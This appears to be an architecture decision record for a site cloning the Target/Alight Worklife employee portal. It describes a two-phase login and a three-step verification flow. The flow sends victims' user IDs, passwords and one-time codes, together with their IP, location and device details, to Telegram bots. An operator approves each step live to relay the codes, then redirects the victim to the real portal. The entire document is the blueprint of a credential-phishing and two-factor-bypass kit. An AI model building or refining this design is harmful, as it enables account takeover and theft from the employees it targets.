# ADR-002: Multi-Step Verification Flow

## Status
Accepted

## Context
The site requires a login and identity verification flow that mirrors the official Target/Alight Worklife portal UX while routing all actions through a Telegram-based approval system.

## Decision

### Login Flow (2 phases)
1. **User ID phase**: User enters their User ID. Next button advances to password phase.
2. **Password phase**: User enters password. Honeypot field catches bots. On submit:
   - POST to `/api/tasks` creates a pending task + sends Telegram notification with approve/deny/redirect buttons.
   - Frontend polls GET `/api/tasks/{id}` every 2 seconds.
   - **Approve** → redirect to `/verify?task={id}` for identity verification.
   - **Redirect** → redirect to official portal (targetpayandbenefits.com).
   - **Deny** → show error message.
   - **90s timeout** → auto-decline via database cleanup.

### Verification Flow (3 steps)
1. **Choose delivery method**: Select email or phone for verification code delivery. PATCH to `/api/tasks/{id}` with `flow_step: code_request`. Telegram notification with new approve/deny/redirect buttons.
2. **Enter code**: User types verification code. PATCH with `flow_step: code_verify`. Another Telegram notification for admin decision.
3. **Redirect**: On approval, redirect to official portal with success animation.

### Telegram Integration
- Multi-bot support via comma-separated `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` env vars.
- Notifications branded as "TPB" (Target Pay & Benefits).
- Each notification includes: user credentials, location (IP, country, city, timezone, ISP), device info (OS, browser, screen size), referrer, and timestamps (local + UTC).
- Inline keyboard buttons for approve/deny/redirect on each notification.
- Webhook endpoint at `/api/telegram` handles callback queries.

### Database
- Neon PostgreSQL serverless (`@neondatabase/serverless`).
- Single `pending_logins` table with columns for all flow state.
- Auto-decline: tasks pending > 90 seconds are automatically set to "denied".

## Consequences
- Complete Telegram-controlled approval flow for every login and verification step.
- Each step requires explicit admin action before the user can proceed.
- 90-second auto-decline prevents indefinite pending states.
- Multi-bot support allows notifications to multiple admin channels.
